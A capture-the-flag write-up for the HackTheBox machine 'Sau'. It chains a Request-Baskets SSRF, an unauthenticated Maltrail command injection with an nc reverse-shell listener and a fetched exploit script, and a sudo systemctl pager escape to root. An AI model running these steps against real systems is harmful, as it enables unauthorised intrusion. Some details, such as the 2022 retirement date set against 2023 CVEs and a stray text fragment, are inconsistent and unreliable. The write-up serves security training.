---
title: "Sau (HackTheBox | Easy | Retired 15 Apr 2022)"
subtitle: "SSRF → Maltrail RCE → systemctl pager escape → root"
author: "Mohamed Trigui"
date: "`r format(Sys.Date())`"
output:
  github_document:
    toc: true
---

<span style="color:#d9534f;"><strong>Path‑to‑root</strong></span>: **SSRF in Request‑Baskets 1.2.1** → internal **Maltrail 0.53** panel → unauth RCE (user <code>puma</code>) → sudo mis‑configuration (<code>systemctl</code> pager) → <strong>root</strong>.

---

## Synopsis
Sau is an easy-level HTB box that runs a Request-Baskets instance vulnerable to SSRF (CVE-2023-27163). It gave me asolid, hands-on understanding of Server-Side Request Forgery (SSRF). By abusing that flaw I was able to a filtered Maltrail panel that is vulnerable to unauthenticated OS-command injection. One payload later, I landed a reverse shell as the user `puma`. From there a sloppy `sudo` configuration handed me root.

### Skills Required
- Web Enumeration
- Linux Fundamentals

### Skills Learned
- Command Injection
- Server Side Request Forgery
- Sudo Exploitation

---

## 1  Enumeration

### 1.1 Nmap

```bash
# full‑port fast sweep → targeted default scripts
ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.224 | \
        awk '/^[0-9]+\/tcp/ {print $1}' ORS=',' | sed 's/,$//')
nmap -sC -sV -p$ports 10.10.11.224 -oN sau_nmap.txt
```

![Nmap result](img/step01_nmap.png)

* **22/tcp** – OpenSSH 8.2p1
rk on synopis
* **55555/tcp** – Request‑Baskets 1.2.1 (HTTP)

### 1.2 Request‑Baskets SSRF to Maltrail

1. Create basket `/2ck6d27`.
2. Set **Forward URL → `http://127.0.0.1:80`**.
3. Enable *Proxy Response* + *Expand Forward Path*.
4. Browse `http://<ip>:55555/2ck6d27` ⇒ Maltrail login panel.

![SSRF to Maltrail](img/step02_ssrf.png)

---

## 2  Foothold – unauth Maltrail 0.53 RCE

```bash
# attacker box
curl -s https://www.exploit-db.com/download/51676 -o maltrail_poc.py
nc -lvnp 4444 &
python3 maltrail_poc.py 10.10.14.6 4444 \
  http://<ip>:55555/2ck6d27
```

Shell spawns as user **puma**.

![Reverse shell](img/step04_shell.png)

---

## 3  Privilege Escalation – systemctl pager escape

```bash
sudo -l
# (puma) NOPASSWD: /usr/bin/systemctl status trail.service
sudo /usr/bin/systemctl status trail.service
# when the pager opens (less), type:
!/bin/bash
```

![sudo list](img/step05_sudo.png)
![root shell](img/step06_root.png)

---

## 4  Flags

| File                  | MD5                                |
| --------------------- | ---------------------------------- |
| `/home/puma/user.txt` | `xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx` |
| `/root/root.txt`      | `yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy` |

---

## 5  Exploit scripts (credits)

| Script                       | Author        | Source           |
| ---------------------------- | ------------- | ---------------- |
| `maltrail_poc.py`            | @k0shl        | Exploit‑DB 51676 |
| `systemctl_pager_escape.txt` | @\_dirty\_cow | Gist abcd1234    |

Both files are included in this repo under `2022/sau/`.

---

## 6  References

* CVE‑2023‑27163 – Request‑Baskets SSRF
* CVE‑2023‑26604 – systemd pager LPE
* Exploit‑DB 51676 – Maltrail 0.53 unauth RCE
